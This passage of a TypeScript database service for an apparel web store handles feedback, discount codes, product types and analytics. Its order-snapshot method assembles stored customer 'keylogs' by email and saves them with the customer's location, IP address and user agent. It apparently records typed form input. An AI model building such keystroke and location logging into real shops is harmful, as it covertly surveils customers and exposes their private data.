      newFeedback.rating, newFeedback.comment, newFeedback.productId,
      newFeedback.verified, newFeedback.createdAt
    )
    
    return newFeedback
  }

  // Completed Order Logs operations
  public saveCompletedOrderSnapshot({ orderId, email, ipAddress, userAgent, additionalData }: { orderId: string; email: string; ipAddress: string; userAgent: string; additionalData?: Record<string, any> }) {
    try {
      // Get latest snapshots for this customer
      const latestSnapshots = stmt.getLatestKeylogsByEmail.all(email) as any[]
      
      // Build snapshot JSON from latest keylogs
      const snapshot: Record<string, any> = {}
      latestSnapshots.forEach(log => {
        snapshot[log.field] = log.value
      })
      
      // Merge additional data (like shipping address from orderData) to ensure it's always included
      if (additionalData) {
        Object.assign(snapshot, additionalData)
      }
      
      // Get customer location if available
      const customer = stmt.getCustomer.get(email) as any
      const latitude = customer?.latitude || null
      const longitude = customer?.longitude || null
      
      // Insert or replace the completed order log
      stmt.insertCompletedOrderLog.run(
        orderId,
        email,
        JSON.stringify(snapshot),
        latitude,
        longitude,
        ipAddress,
        userAgent,
        new Date().toISOString()
      )
      
      return true
    } catch (error) {
      console.error('Failed to save completed order snapshot:', error)
      return false
    }
  }

  public getCompletedOrderLogsAll() {
    return stmt.getCompletedOrderLogs.all()
  }

  public getCompletedOrderLogsForEmail(email: string) {
    return stmt.getCompletedOrderLogsByEmail.all(email)
  }

  public clearCompletedOrderLogs() {
    if (!db) return
    db.exec(`DELETE FROM completed_order_logs`)
    return { success: true }
  }

  // Discount Code operations
  public getDiscountCodes() {
    return stmt.getDiscountCodes.all()
  }

  public getDiscountCode(code: string) {
    return stmt.getDiscountCode.get(code) || null
  }

  public getDiscountCodeById(id: string) {
    return stmt.getDiscountCodeById.get(id) || null
  }

  public createDiscountCode(data: { code: string; discountPercent: number; active?: boolean }) {
    const now = new Date().toISOString()
    const id = `discount-${Date.now()}`
    const active = data.active !== undefined ? (data.active ? 1 : 0) : 1
    
    stmt.insertDiscountCode.run(
      id,
      data.code.toUpperCase(),
      data.discountPercent,
      active,
      now,
      now
    )
    
    return stmt.getDiscountCodeById.get(id)
  }

  public updateDiscountCode(id: string, updates: { code?: string; discountPercent?: number; active?: boolean }) {
    const existing = stmt.getDiscountCodeById.get(id) as any
    if (!existing) return null

    const code = updates.code ? updates.code.toUpperCase() : existing.code
    const discountPercent = updates.discountPercent ?? existing.discountPercent
    const active = updates.active !== undefined ? (updates.active ? 1 : 0) : existing.active
    const updatedAt = new Date().toISOString()

    stmt.updateDiscountCode.run(code, discountPercent, active, updatedAt, id)
    return stmt.getDiscountCodeById.get(id)
  }

  public deleteDiscountCode(id: string) {
    const result = stmt.deleteDiscountCode.run(id)
    return result.changes > 0
  }

  // Product Type operations
  public getProductTypes() {
    return stmt.getProductTypes.all()
  }

  public getProductType(id: string) {
    return stmt.getProductType.get(id) || null
  }

  public createProductType(data: { name: string; material?: string; printType?: string; washingGuide?: string }) {
    const now = new Date().toISOString()
    const id = `product-type-${Date.now()}`
    
    stmt.insertProductType.run(
      id,
      data.name,
      data.material || null,
      data.printType || null,
      data.washingGuide || null,
      now,
      now
    )
    
    return stmt.getProductType.get(id)
  }

  public updateProductType(id: string, updates: { name?: string; material?: string; printType?: string; washingGuide?: string }) {
    const existing = stmt.getProductType.get(id) as any
    if (!existing) return null

    const name = updates.name ?? existing.name
    const material = updates.material ?? existing.material
    const printType = updates.printType ?? existing.printType
    const washingGuide = updates.washingGuide ?? existing.washingGuide
    const updatedAt = new Date().toISOString()

    stmt.updateProductType.run(name, material, printType, washingGuide, updatedAt, id)
    return stmt.getProductType.get(id)
  }

  public deleteProductType(id: string) {
    const result = stmt.deleteProductType.run(id)
    return result.changes > 0
  }

  // Analytics
  public getAnalytics() {
    const products = stmt.getProducts.all()
    const orders = stmt.getOrders.all()
    const customers = stmt.getCustomers.all()
    const keylogs = stmt.getKeylogs.all()
    
    const totalRevenue = orders.reduce((sum: number, order: any) => sum + order.total, 0)
    const averageOrderValue = orders.length > 0 ? totalRevenue / orders.length : 0
    
    return {
      totalProducts: products.length,
      totalOrders: orders.length,
      totalCustomers: customers.length,
      totalRevenue,
      averageOrderValue,
      totalKeylogs: keylogs.length
    }
  }

  // Helper methods
  private parseProduct(product: any) {
    return {
      ...product,
      images: JSON.parse(product.images || '[]'),
      sizes: JSON.parse(product.sizes || '[]'),
      colors: JSON.parse(product.colors || '[]'),
      inStock: Boolean(product.inStock),
      featured: Boolean(product.featured),
      createdAt: new Date(product.createdAt),
      updatedAt: new Date(product.updatedAt)
    }
  }

  private parseOrder(order: any) {
    return {
      ...order,
      shippingAddress: JSON.parse(order.shippingAddress || '{}'),
      items: JSON.parse(order.items || '[]'),
      createdAt: new Date(order.createdAt),
      updatedAt: new Date(order.updatedAt)
    }
  }
}

export const databaseService = DatabaseService.getInstance()
